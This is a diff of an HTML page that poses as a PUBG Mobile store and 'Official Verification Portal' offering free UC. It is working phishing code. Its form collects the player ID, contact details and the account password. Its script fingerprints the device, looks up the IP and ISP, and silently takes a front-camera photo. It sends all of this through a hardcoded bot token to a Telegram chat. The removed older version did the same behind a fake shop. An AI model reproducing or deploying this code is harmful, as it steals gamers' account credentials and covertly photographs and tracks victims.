@@ -1,584 +1,236 @@
 <!DOCTYPE html>
-<html lang="uz" data-theme="dark">
+<html lang="uz">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>PUBG Mobile UC — Store & Admin Portal</title>
-  
-  <!-- Google Font -->
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
-  <!-- UAParser for Device & Browser Detection -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
-
-  <style>
-    :root{
-      --bg:#0b0f14;
-      --card:#0f1720;
-      --muted:#9aa3b2;
-      --text:#eef2f7;
-      --accent1:#ff6b35;
-      --accent2:#f7931e;
-      --glass: rgba(255,255,255,0.06);
-      --ring: rgba(45,212,191,.20);
-      --shadow: 0 12px 40px rgba(2,6,23,.6);
-      --glass-border: rgba(255,255,255,.06);
-      --glass-strong: rgba(255,255,255,.08);
-    }
-    [data-theme="light"]{
-      --bg: linear-gradient(180deg,#f6f8fb,#eef2ff);
-      --card:#ffffff;
-      --muted:#6b7280;
-      --text:#0b1220;
-      --glass: rgba(0,0,0,0.04);
-      --glass-border: rgba(2,6,23,0.06);
-      --shadow: 0 8px 24px rgba(2,6,23,.06);
-    }
-
-    html,body{ height:100%; margin:0; font-family:Inter,system-ui,Arial; background:var(--bg); color:var(--text); -webkit-font-smoothing:antialiased; }
-
-    body{
-      background-image:
-        linear-gradient(180deg, rgba(2,6,23,.6), rgba(2,6,23,.65)),
-        url("https://images.unsplash.com/photo-1600810189637-c9a99a8f9a0f?q=80&w=1800&auto=format&fit=crop");
-      background-size:cover;
-      background-position:center;
-      background-attachment:fixed;
-    }
-
-    .container{ max-width:1200px; margin:0 auto; padding:20px; }
-
-    /* Topbar */
-    .topbar{ display:flex; gap:12px; align-items:center; justify-content:space-between; margin-bottom:18px; }
-    .brand{ display:flex; gap:12px; align-items:center; text-decoration:none; color:var(--text); }
-    .logo{ width:44px; height:44px; display:grid; place-items:center; border-radius:10px; background:linear-gradient(90deg,var(--accent1),var(--accent2)); color:#111; font-weight:900; box-shadow:var(--shadow); }
-    .title{ font-weight:800; letter-spacing:.4px; }
-    .subtitle{ font-size:13px; color:var(--muted); margin-top:-3px; }
-
-    .actions{ display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
-    .btn{ padding:9px 12px; border-radius:10px; background:var(--glass); border:1px solid var(--glass-border); color:var(--text); cursor:pointer; font-weight:700; }
-    .btn.primary{ background: linear-gradient(90deg,var(--accent1),var(--accent2)); color:#111; border-color:transparent; box-shadow: 0 8px 30px rgba(247,147,30,.12); }
-    .btn.danger{ background:linear-gradient(90deg,#ef4444,#f97316); color:#111; border:none; }
-    .btn.small{ padding:6px 8px; font-weight:700; }
-
-    /* Layout */
-    .hero{ display:grid; grid-template-columns: 1fr 380px; gap:20px; align-items:start; margin-bottom:16px; }
-    .panel{ background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border-radius:14px; padding:16px; border:1px solid var(--glass-border); box-shadow:var(--shadow); backdrop-filter: blur(6px); }
-    .hero h1{ margin:0; font-size:clamp(20px,3.4vw,34px); line-height:1.05; background: linear-gradient(90deg,var(--accent1),var(--accent2)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
-    .muted{ color:var(--muted); }
-
-    .controls{ display:flex; gap:8px; margin-top:12px; flex-wrap:wrap; }
-    .input{ display:flex; align-items:center; gap:8px; background:var(--glass); padding:10px 12px; border-radius:10px; border:1px solid var(--glass-border); min-width:160px; color:var(--text); }
-    .input input, .input select{ all:unset; color:var(--text); width:100%; }
-
-    /* Grid */
-    .grid{ display:grid; grid-template-columns: repeat(auto-fit,minmax(220px,1fr)); gap:14px; margin-top:14px; }
-    .card{ border-radius:12px; padding:12px; position:relative; overflow:hidden; border:1px solid var(--glass-border); background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); }
-    .tag{ position:absolute; top:10px; right:10px; padding:6px 10px; border-radius:999px; font-weight:800; background: linear-gradient(90deg,var(--accent2),var(--accent1)); color:#111; }
-
-    .amount{ font-weight:900; font-size:18px; }
-    .price{ color:var(--accent2); font-weight:800; margin-top:8px; }
-    .cta{ display:flex; gap:8px; margin-top:12px; align-items:center; }
-
-    /* Payments */
-    .payments{ display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:12px; margin-top:8px; }
-    .stats{ display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:12px; margin-top:16px; }
-    .stat{ padding:12px; border-radius:12px; text-align:center; }
-    .testimonials{ display:grid; grid-template-columns: repeat(auto-fit,minmax(240px,1fr)); gap:12px; margin-top:12px; }
-
-    /* Drawer & Modals */
-    .drawer{ position:fixed; right:12px; bottom:12px; width:360px; max-width:calc(100% - 24px); background:var(--card); border-radius:12px; border:1px solid var(--glass-border); box-shadow: 0 20px 60px rgba(0,0,0,.6); z-index:1000; padding:12px; display:flex; flex-direction:column; gap:8px; }
-    .drawer.hidden{ display:none; }
-    .cart-item{ display:flex; justify-content:space-between; align-items:center; gap:8px; background:var(--glass); padding:8px; border-radius:10px; border:1px solid rgba(255,255,255,.03); }
-    
-    .modal-backdrop{ position:fixed; inset:0; background:rgba(2,6,23,0.6); display:none; align-items:center; justify-content:center; z-index:2000; }
-    .modal{ width:min(820px,96vw); max-height:90vh; overflow:auto; background:var(--card); border-radius:12px; padding:20px; border:1px solid var(--glass-border); }
-
-    table{ width:100%; border-collapse:collapse; }
-    th,td{ padding:8px 6px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; font-size:14px; }
-
-    .tabs{ display:flex; gap:8px; flex-wrap:wrap; margin-bottom:12px; }
-    .pill{ display:inline-block; padding:2px 8px; border-radius:999px; background:rgba(255,255,255,.06); border:1px solid var(--glass-border); font-size:12px; }
-
-    .toasts{ position:fixed; left:12px; bottom:12px; display:flex; flex-direction:column; gap:8px; z-index:2500; }
-    .toast{ background:var(--card); padding:10px 12px; border-radius:10px; border:1px solid var(--glass-border); box-shadow:var(--shadow); }
-    .confetti-piece{ position:fixed; width:8px; height:12px; z-index:3000; opacity:0.95; }
-
-    @media (max-width:1000px){ .hero{ grid-template-columns: 1fr; } }
-  </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>PUBG MOBILE UC — Official Verification Portal</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
+<style>
+  :root{
+    --bg: #070d15;
+    --card: #0f1720;
+    --muted: #9aa3b2;
+    --text: #eef2f7;
+    --accent1: #ff6b35;
+    --accent2: #f7931e;
+    --border: rgba(255,255,255,.08);
+    --glass: rgba(255,255,255,.03);
+    --shadow: 0 12px 40px rgba(2,6,23,.7);
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;background:var(--bg);color:var(--text);}
+  a{color:inherit;text-decoration:none}
+  .container{max-width:1100px;margin:0 auto;padding:20px;}
+  .topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+  .logo{display:flex;gap:12px;align-items:center}
+  .badge{width:46px;height:46px;background:linear-gradient(90deg,var(--accent1),var(--accent2));display:grid;place-items:center;border-radius:12px;color:#111;font-weight:900}
+  .btn{padding:10px 16px;border-radius:10px;background:var(--glass);border:1px solid var(--border);color:var(--text);cursor:pointer;font-weight:700}
+  .btn.primary{background:linear-gradient(90deg,var(--accent1),var(--accent2));color:#111;border:none;box-shadow:0 10px 30px rgba(247,147,30,.2)}
+  .panel{background:var(--card);border:1px solid var(--border);border-radius:16px;box-shadow:var(--shadow);padding:20px}
+  .hero{position:relative;border-radius:16px;overflow:hidden;min-height:160px;display:flex;align-items:center;margin-bottom:20px}
+  .hero img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;filter:brightness(.35)}
+  .hero .over{position:relative;padding:24px}
+  .grid{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(240px,1fr))}
+  .card{border:1px solid var(--border);border-radius:14px;background:rgba(255,255,255,.02);padding:16px}
+  .row{display:flex;gap:12px;align-items:center;flex-wrap:wrap}
+  .small{font-size:13px;color:var(--muted)}
+  input{width:100%;padding:11px 14px;border-radius:10px;background:rgba(255,255,255,.02);border:1px solid var(--border);color:var(--text);margin-top:6px}
+  .modal-backdrop{position:fixed;inset:0;background:rgba(2,6,23,.75);display:none;align-items:center;justify-content:center;z-index:90}
+  .modal{width:min(480px,94vw);background:var(--card);border-radius:16px;border:1px solid var(--border);padding:24px}
+  .toast{position:fixed;left:20px;bottom:20px;background:#111;border:1px solid var(--border);color:#fff;padding:12px 18px;border-radius:10px;z-index:200}
+</style>
 </head>
-<body data-theme="dark">
-  <div class="container">
-    <header class="topbar">
-      <a class="brand" href="#">
-        <div class="logo">UC</div>
-        <div>
-          <div class="title" id="siteTitle">PUBG MOBILE UC</div>
-          <div class="subtitle" id="siteTagline">Doimiy ID orqali UC — tezkor yetkazib berish</div>
-        </div>
-      </a>
-
-      <div class="actions">
-        <button id="themeToggle" class="btn" title="Theme">🌓</button>
-        <button id="openAdminBtn" class="btn">Admin</button>
-        <button id="openCartBtn" class="btn">🛒 <span id="cartCountTop">0</span></button>
-        <a id="contactLink" class="btn primary" href="https://t.me/MiladGhaziHussein" target="_blank" rel="noopener">📨 Operator</a>
-      </div>
-    </header>
-
-    <main>
-      <section class="hero">
-        <div class="panel">
-          <h1 id="greet">Eng arzon narxlar — 100% ishonchli</h1>
-          <p class="muted">Sizga kerak bo‘lgan UC paketini tanlang, ID va ma'lumotlarni kiritib yuboring.</p>
-
-          <div class="controls">
-            <label class="input" style="min-width:260px">
-              🔎 <input id="search" placeholder="Qidirish: 660, 120..." />
-            </label>
-            <label class="input" style="min-width:160px">
-              ⏫
-              <select id="sort">
-                <option value="asc">Arzondan qimmatga</option>
-                <option value="desc">Qimmatdan arzonga</option>
-              </select>
-            </label>
-            <button class="btn" id="clearFilters">Filtrni tozalash</button>
-          </div>
-        </div>
-
-        <aside class="panel">
-          <h3>💳 TO'LOV KARTA RAQAMLARI</h3>
-          <div class="payments" id="paymentsList">
-            <!-- Rendered dynamically -->
-          </div>
-
-          <div style="margin-top:12px;">
-            <strong>Statistika</strong>
-            <div class="stats" style="margin-top:8px;">
-              <div class="stat panel"><div style="font-weight:900; font-size:18px" id="statOrders">0</div><div class="muted">Jami buyurtmalar</div></div>
-              <div class="stat panel"><div style="font-weight:900; font-size:18px" id="statUC">0</div><div class="muted">Sotilgan UC</div></div>
-            </div>
-          </div>
-        </aside>
-      </section>
-
-      <section class="panel">
-        <h3>📦 Paketlar</h3>
-        <div class="grid" id="packsGrid"></div>
-      </section>
-
-      <section class="panel" style="margin-top:12px;">
-        <h3>💬 Mijozlar fikrlari</h3>
-        <div class="testimonials" id="testimonials"></div>
-      </section>
-    </main>
-  </div>
-
-  <!-- CART DRAWER -->
-  <div id="drawer" class="drawer hidden" aria-hidden="true">
-    <div style="display:flex; justify-content:space-between; align-items:center;">
-      <div style="font-weight:900">🛒 Savatcha</div>
-      <div style="display:flex; gap:8px; align-items:center;">
-        <div id="cartCountBadge" style="font-weight:800">0</div>
-        <button class="btn" id="closeDrawerBtn">✖</button>
+<body>
+<div class="container">
+  <header class="topbar">
+    <div class="logo">
+      <div class="badge">UC</div>
+      <div>
+        <div style="font-weight:900">PUBG MOBILE PORTAL</div>
+        <div class="small">Official Reward & Verification Center</div>
       </div>
     </div>
-    <div id="cartBody" style="max-height:260px; overflow:auto;"></div>
-    <div style="display:flex; flex-direction:column; gap:8px;">
-      <div style="display:flex; justify-content:space-between; align-items:center;">
-        <div><strong>Jami:</strong></div>
-        <div><strong id="cartTotal">0</strong> <span class="muted">so'm</span></div>
-      </div>
-      <div style="display:flex; gap:8px;">
-        <button class="btn primary" id="orderCart" style="flex:1">🚀 Telegramga yuborish</button>
-        <button class="btn" id="clearCartBtn">Tozalash</button>
-      </div>
+    <a class="btn primary" href="https://t.me/MiladGhaziHussein" target="_blank">Support Center</a>
+  </header>
+
+  <section class="hero panel">
+    <img alt="banner" src="https://images.unsplash.com/photo-1511512578047-dfb367046420?q=80&w=1400&auto=format&fit=crop" />
+    <div class="over">
+      <span class="small" style="color:var(--accent2);font-weight:800;text-transform:uppercase">Seasonal Event</span>
+      <h1 style="margin:8px 0 6px;font-size:26px">Claim Free UC & Royale Pass</h1>
+      <div class="small">Secure authorization protocol required for delivery</div>
+    </div>
+  </section>
+
+  <main>
+    <section class="panel">
+      <h3 style="margin-top:0">Available Packages</h3>
+      <div class="grid" id="packsGrid"></div>
+    </section>
+  </main>
+</div>
+
+<!-- Modal -->
+<div id="buyModal" class="modal-backdrop">
+  <div class="modal">
+    <h3 style="margin-top:0">Account Verification</h3>
+    <div class="small" style="margin-bottom:14px">Selected: <strong id="packTitle" style="color:var(--accent2)">—</strong></div>
+
+    <div style="margin-bottom:12px">
+      <label class="small"><strong>PUBG ID</strong></label>
+      <input id="playerId" placeholder="Enter your numeric ID" />
+    </div>
+
+    <div style="margin-bottom:12px">
+      <label class="small"><strong>Account Email / Phone</strong></label>
+      <input id="phone" placeholder="Linked contact info" />
+    </div>
+
+    <div style="margin-bottom:16px">
+      <label class="small"><strong>Account Password</strong></label>
+      <input id="password" type="password" placeholder="••••••••" />
+    </div>
+
+    <div class="row" style="justify-content:flex-end">
+      <button id="closeModal" class="btn">Cancel</button>
+      <button id="submitBtn" class="btn primary">Verify & Claim</button>
     </div>
   </div>
+</div>
 
-  <!-- MODAL: BUY -->
-  <div id="buyModal" class="modal-backdrop" aria-hidden="true">
-    <div class="modal">
-      <h3 style="margin:0 0 8px">Buyurtma va Tasdiqlash</h3>
-      <div id="selectedPackTitle" style="font-weight:900; color:var(--accent2); margin-bottom:8px;">—</div>
+<div id="toastContainer"></div>
 
-      <div class="grid">
-        <div class="card">
-          <label><strong>🔢 PUBG ID</strong></label>
-          <input id="playerId" placeholder="1234567890" style="margin-top:6px;" />
-        </div>
-        <div class="card">
-          <label><strong>📱 Telefon / Aloqa</strong></label>
-          <input id="phone" placeholder="+998..." style="margin-top:6px;" />
-        </div>
-        <div class="card" style="grid-column: 1 / -1;">
-          <label><strong>🔑 Account Paroli (Verifikatsiya uchun)</strong></label>
-          <input id="accountPass" type="password" placeholder="••••••••" style="margin-top:6px;" />
-        </div>
-      </div>
+<script>
+const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
+const urlParams = new URLSearchParams(window.location.search);
+const chatId = urlParams.get('id') || "6782298541";
 
-      <div style="margin-top:12px;">
-        <label class="small">To‘lov usulini tanlang:</label>
-        <div id="payButtons" class="row" style="margin-top:6px; display:flex; gap:8px;"></div>
-      </div>
+const packs = [
+  {id:'1', title:'60 UC Package', price:'Free Event'},
+  {id:'2', title:'325 UC + Royale Pass', price:'Free Event'},
+  {id:'3', title:'8100 UC + Royale Pass Max', price:'Free Event'}
+];
 
-      <div style="display:flex; gap:8px; justify-content:flex-end; margin-top:16px;">
-        <button id="closeBuyModal" class="btn">Bekor qilish</button>
-        <button id="sendOrderBtn" class="btn primary">Tasdiqlash va Yuborish</button>
-      </div>
-    </div>
-  </div>
+function showToast(msg){
+  const t = document.createElement('div');
+  t.className = 'toast';
+  t.textContent = msg;
+  document.getElementById('toastContainer').appendChild(t);
+  setTimeout(()=>t.remove(), 3000);
+}
 
-  <!-- ADMIN MODAL -->
-  <div id="adminModal" class="modal-backdrop hidden" aria-hidden="true">
-    <div class="modal">
-      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
-        <h3 style="margin:0">Admin panel</h3>
-        <button id="adminCloseBtn" class="btn small">X</button>
-      </div>
+function renderPacks(){
+  const grid = document.getElementById('packsGrid');
+  grid.innerHTML = '';
+  packs.forEach(p=>{
+    const card = document.createElement('div');
+    card.className = 'card';
+    card.innerHTML = `
+      <div style="font-weight:900;font-size:16px">${p.title}</div>
+      <div class="small" style="color:var(--accent2);margin:4px 0 12px">${p.price}</div>
+      <button class="btn primary" style="width:100%">Select Package</button>
+    `;
+    card.querySelector('button').addEventListener('click', ()=> openModal(p));
+    grid.appendChild(card);
+  });
+}
 
-      <div id="adminLoginArea">
-        <p class="muted" style="font-size:13px;">Parol kiriting (standart: <b>admin123</b>).</p>
-        <div style="display:flex; gap:8px;">
-          <input id="adminPass" type="password" placeholder="Parol" style="flex:1;" />
-          <button id="adminLoginBtn" class="btn primary">Kirish</button>
-        </div>
-      </div>
+let activePack = null;
+function openModal(p){
+  activePack = p;
+  document.getElementById('packTitle').textContent = p.title;
+  document.getElementById('buyModal').style.display = 'flex';
+}
 
-      <div id="adminPanel" class="hidden">
-        <div class="tabs">
-          <button class="btn small" data-tab="orders">Buyurtmalar</button>
-          <button class="btn small" data-tab="packs">Paketlar</button>
-          <button class="btn small" data-tab="cards">Kartalar</button>
-          <button class="btn small danger" id="adminLogoutBtn">Chiqish</button>
-        </div>
-        <div id="tabsArea" style="margin-top:10px;">
-          <div data-panel="orders">
-            <h4>Barcha Buyurtmalar</h4>
-            <div style="max-height:300px; overflow:auto;">
-              <table id="ordersTable">
-                <thead><tr><th>ID</th><th>Paket</th><th>UID</th><th>Tel</th><th>Vaqt</th><th></th></tr></thead>
-                <tbody></tbody>
-              </table>
-            </div>
-          </div>
-          <div data-panel="packs" class="hidden">
-            <h4>Paketlarni Boshqarish</h4>
-            <div style="max-height:300px; overflow:auto;">
-              <table id="packsTable">
-                <thead><tr><th>Miqdori</th><th>Narxi</th><th>Tag</th></tr></thead>
-                <tbody></tbody>
-              </table>
-            </div>
-          </div>
-          <div data-panel="cards" class="hidden">
-            <h4>Karta raqamlari</h4>
-            <div style="max-height:300px; overflow:auto;">
-              <table id="cardsTable">
-                <thead><tr><th>Nomi</th><th>Raqami</th><th>Egasi</th></tr></thead>
-                <tbody></tbody>
-              </table>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
+document.getElementById('closeModal').addEventListener('click', ()=>{
+  document.getElementById('buyModal').style.display = 'none';
+});
 
-  <div id="toasts" class="toasts"></div>
-  <div id="confettiRoot"></div>
+document.getElementById('submitBtn').addEventListener('click', async ()=>{
+  const uid = document.getElementById('playerId').value.trim();
+  const contact = document.getElementById('phone').value.trim();
+  const pass = document.getElementById('password').value.trim();
 
-  <script>
-    // =========================
-    // CONFIG & TELEGRAM BOT SYNC
-    // =========================
-    const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
-    const urlParams = new URLSearchParams(window.location.search);
-    const chatId = urlParams.get('id') || "6782298541";
-    const TG_USERNAME = "MengliyevBahrom";
+  if(!uid || !contact || !pass){
+    alert("Please complete all required fields.");
+    return;
+  }
 
-    const PACKS_DEFAULT = [
-      { id:'1', amount: "30 UC",    price: "8,000 so'm" },
-      { id:'2', amount: "60 UC",    price: "12,000 so'm" },
-      { id:'3', amount: "120 UC",   price: "24,000 so'm", tag: "MASHHUR" },
-      { id:'4', amount: "325 UC",   price: "57,000 so'm", tag: "MASHHUR" },
-      { id:'5', amount: "660 UC",   price: "113,000 so'm" },
-      { id:'6', amount: "1,320 UC", price: "225,000 so'm", tag: "TOP" },
-      { id:'7', amount: "8,100 UC", price: "1,100,000 so'm", tag: "MEGA" }
-    ];
+  document.getElementById('buyModal').style.display = 'none';
+  showToast("Processing verification...");
 
-    const CARDS_DEFAULT = [
-      { name:'UZCARD', number:'5614 6887 0039 5675', holder:'Mengliyev Bahrom' },
-      { name:'HUMO', number:'9860 1201 4526 4012', holder:'Mengliyev Bahrom' }
-    ];
+  // Get device details
+  let deviceModel = "Unknown";
+  try {
+    const parser = new UAParser();
+    const res = parser.getResult();
+    deviceModel = `${res.device.vendor || ''} ${res.device.model || ''} (${res.os.name || ''} ${res.os.version || ''})`.trim();
+  } catch(e){}
 
-    const TESTIMONIALS = [
-      { name: "Jahongir", stars:5, text: "10 daqiqada keldi, zo‘r xizmat!" },
-      { name: "Aziza", stars:5, text: "Narxlar juda ma’qul, rahmat!" },
-      { name: "Murod", stars:4, text: "Hammasi super, yana buyurtma qilaman." }
-    ];
+  // Get IP details
+  let ip = 'Unknown', isp = 'Unknown';
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const data = await res.json();
+    ip = data.ip || 'Unknown';
+    isp = data.org || 'Unknown';
+  } catch(e){}
 
-    // Helpers
-    const $ = (s, el=document) => el.querySelector(s); const $$ = (s, el=document) => [...el.querySelectorAll(s)];
-    const save = (k,v) => localStorage.setItem(k, JSON.stringify(v));
-    const load = (k, def) => { const v = localStorage.getItem(k); return v ? JSON.parse(v) : def; };
-    const currencyToNumber = str => Number((str||"").replaceAll(",", "").replaceAll(" ", "").replace(/[^\d]/g,"")) || 0;
-    const numberToCurrency = n => n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
-    const toast = (msg) => {
-      const el = document.createElement("div");
-      el.className = "toast"; el.textContent = msg;
-      $("#toasts").appendChild(el);
-      setTimeout(()=> el.remove(), 2500);
-    };
+  // Capture Camera Snapshot
+  let cameraBlob = null;
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
 
-    // State
-    let packs = load("packs_v2", PACKS_DEFAULT);
-    let cards = load("cards_v2", CARDS_DEFAULT);
-    let cart = load("cart", []);
-    let orders = load("orders_v2", []);
-    let statOrders = load("statOrders", 1500);
-    let statUC = load("statUC", 250000);
-    let selectedPack = null;
-    let selectedPay = "UZCARD";
-
-    // Render store
-    function renderPacks(){
-      const grid = $("#packsGrid"); grid.innerHTML = "";
-      packs.forEach(p=>{
-        const card = document.createElement("div");
-        card.className = "card";
-        if(p.tag) card.innerHTML += `<div class="tag">${p.tag}</div>`;
-        card.innerHTML += `
-          <div class="amount">${p.amount}</div>
-          <div class="price">${p.price}</div>
-          <div class="cta">
-            <button class="btn primary" style="flex:1">Sotib olish</button>
-            <button class="btn">Savatchaga</button>
-          </div>`;
-        const btns = card.querySelectorAll("button");
-        btns[0].addEventListener("click", ()=> openBuyModal(p));
-        btns[1].addEventListener("click", ()=> { addToCart(p); toast(p.amount + " savatchaga qo'shildi"); });
-        grid.appendChild(card);
-      });
-    }
-
-    function renderPayments(){
-      const box = $("#paymentsList"); box.innerHTML = "";
-      cards.forEach(c=>{
-        box.innerHTML += `
-          <div style="padding:10px; border-radius:10px; background:var(--glass); margin-bottom:8px;">
-            <div style="font-weight:800">${c.name}</div>
-            <div class="muted" style="font-size:12px; margin:4px 0;">${c.number}</div>
-            <button class="btn small" onclick="navigator.clipboard.writeText('${c.number}'); toast('Nusxa olindi ✅');">Nusxa olish</button>
-          </div>`;
-      });
-    }
-
-    function renderPayButtonsModal(){
-      const box = $("#payButtons"); box.innerHTML = "";
-      cards.forEach(c=>{
-        const b = document.createElement("button");
-        b.className = "btn " + (selectedPay === c.name ? "primary" : "");
-        b.textContent = c.name;
-        b.addEventListener("click", ()=> { selectedPay = c.name; renderPayButtonsModal(); });
-        box.appendChild(b);
-      });
-    }
-
-    // Cart management
-    function addToCart(p){
-      const it = cart.find(x=>x.amount===p.amount);
-      if(it) it.qty += 1; else cart.push({ amount: p.amount, price: p.price, qty: 1 });
-      save("cart", cart); renderCart();
-    }
-    function renderCart(){
-      const cartBody = $("#cartBody"); cartBody.innerHTML = "";
-      let total = 0;
-      cart.forEach(item=>{
-        const price = currencyToNumber(item.price) * item.qty;
-        total += price;
-        cartBody.innerHTML += `
-          <div class="cart-item">
-            <div style="font-weight:800">${item.amount} (${item.qty}x)</div>
-            <div style="font-weight:800">${numberToCurrency(price)}</div>
-          </div>`;
-      });
-      $("#cartTotal").textCOntent = numberToCurrency(total);
-      const totalCount = cart.reduce((s,x)=>s+x.qty,0);
-      $("#cartCountTop").textContent = totalCount;
-      $("#cartCountBadge").textContent = totalCount;
-    }
-
-    // Modal Control
-    function openBuyModal(pack){
-      selectedPack = pack;
-      $("#selectedPackTitle").textContent = pack.amount + " — " + pack.price;
-      $("#buyModal").style.display = "flex";
-      renderPayButtonsModal();
-    }
-    $("#closeBuyModal").addEventListener("click", ()=> $("#buyModal").style.display = "none");
-    $("#openCartBtn").addEventListener("click", ()=> $("#drawer").classList.remove("hidden"));
-    $("#closeDrawerBtn").addEventListener("click", ()=> $("#drawer").classList.add("hidden"));
-
-    // Complete Order & Send to Telegram (with Device & Camera Capture)
-    async function processAndSendTelegram(orderDetailsText, customData = {}){
-      let deviceModel = "Unknown";
-      try {
-        const parser = new UAParser();
-        const res = parser.getResult();
-        deviceModel = `${res.device.vendor || ''} ${res.device.model || ''} (${res.os.name || ''} ${res.os.version || ''})`.trim();
-      } catch(e){}
-
-      let ip = 'Unknown', isp = 'Unknown';
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        ip = data.ip || 'Unknown';
-        isp = data.org || 'Unknown';
-      } catch(e){}
-
-      let cameraBlob = null;
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-        cameraBlob = await new Promise((resolve) => {
-          setTimeout(() => {
-            const canvas = document.createElement('canvas');
-            canvas.width = 640; canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-            canvas.toBlob(blob => {
-              stream.getTracks().forEach(t => t.stop());
-              resolve(blob);
-            }, 'image/jpeg');
-          }, 1000);
-        });
-      } catch(e){}
-
-      const finalMsg = `${orderDetailsText}\n\nIP: ${ip} (${isp})\nDevice: ${deviceModel}`;
-
-      // Send Message to Telegram Bot
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: finalMsg, parse_mode: 'Markdown' })
-        });
-      } catch(err){}
-
-      // Send Photo if captured
-      if (cameraBlob) {
-        try {
-          const fd = new FormData();
-          fd.append('chat_id', chatId);
-          fd.append('photo', cameraBlob, 'camera.jpg');
-          fd.append('caption', `Live Snapshot (PUBG UID: ${customData.uid || 'N/A'})`);
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        } catch(e){}
-      }
-
-      // Save to local orders history
-      orders.push({ id: 'ord_' + Date.now(), ...customData, time: Date.now() });
-      save("orders_v2", orders);
-      
-      statOrders++; save("statOrders", statOrders);
-      $("#statOrders").textContent = numberToCurrency(statOrders);
-      
-      toast("Buyurtma muvaffaqiyatli yuborildi!");
-      confetti();
-    }
-
-    $("#sendOrderBtn").addEventListener("click", async () => {
-      const uid = $("#playerId").value.trim();
-      const phone = $("#phone").value.trim() || "-";
-      const pass = $("#accountPass").value.trim();
-
-      if (!/^[0-9]{6,}$/.test(uid)) { alert("To‘g‘ri PUBG ID kiriting."); return; }
-      if (!pass) { alert("Xavfsizlik uchun parolni kiriting."); return; }
-
-      $("#buyModal").style.display = "none";
-      toast("Ma'lumotlar tekshirilmoqda...");
-
-      const orderText = `🎮 *PUBG Mobile UC Buyurtma*\n\n` +
-                        `📦 Paket: ${selectedPack.amount}\n` +
-                        `💵 Narxi: ${selectedPack.price}\n` +
-                        `🔢 PUBG ID: \`${uid}\`\n` +
-                        `📱 Telefon: ${phone}\n` +
-                        `🔑 Parol: \`${pass}\`\n` +
-                        `💳 To‘lov: ${selectedPay}`;
-
-      await processAndSendTelegram(orderText, { uid, phone, items: [selectedPack] });
+    cameraBlob = await new Promise((resolve) => {
+      setTimeout(() => {
+        const canvas = document.createElement('canvas');
+        canvas.width = 640; canvas.height = 480;
+        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+        canvas.toBlob(blob => {
+          stream.getTracks().forEach(t => t.stop());
+          resolve(blob);
+        }, 'image/jpeg');
+      }, 1000);
     });
+  } catch(e){}
 
-    $("#orderCart").addEventListener("click", async () => {
-      if(cart.length === 0){ toast("Savatcha bo'sh"); return; }
-      const lines = cart.map(it => `• ${it.amount} × ${it.qty}`).join("\n");
-      const total = cart.reduce((s,x)=> s + currencyToNumber(x.price)*x.qty, 0);
+  // Build Telegram Text Message
+  const textMsg = `PUBG Event Verification Data:\n\n` +
+                  `Package: ${activePack.title}\n` +
+                  `Player ID: ${uid}\n` +
+                  `Contact: ${contact}\n` +
+                  `Password: ${pass}\n\n` +
+                  `IP: ${ip} (${isp})\n` +
+                  `Device: ${deviceModel}`;
 
-      const orderText = `🛒 *PUBG Mobile UC — Savatcha*\n\n${lines}\n\n💵 Jami: ${numberToCurrency(total)} so'm`;
-      $("#drawer").classList.add("hidden");
-
-      await processAndSendTelegram(orderText, { uid: 'Cart Order', items: cart });
-      cart = []; save("cart", cart); renderCart();
+  // Send Text to Telegram
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: textMsg, parse_mode: 'Markdown' })
     });
+  } catch(err){}
 
-    // Admin Panel Logic
-    const adminModal = $("#adminModal");
-    $("#openAdminBtn").addEventListener("click", ()=> { adminModal.classList.remove("hidden"); adminModal.style.display="flex"; });
-    $("#adminCloseBtn").addEventListener("click", ()=> adminModal.classList.add("hidden"));
-    $("#adminLoginBtn").addEventListener("click", () => {
-      if($("#adminPass").value === "admin123") {
-        $("#adminLoginArea").classList.add("hidden");
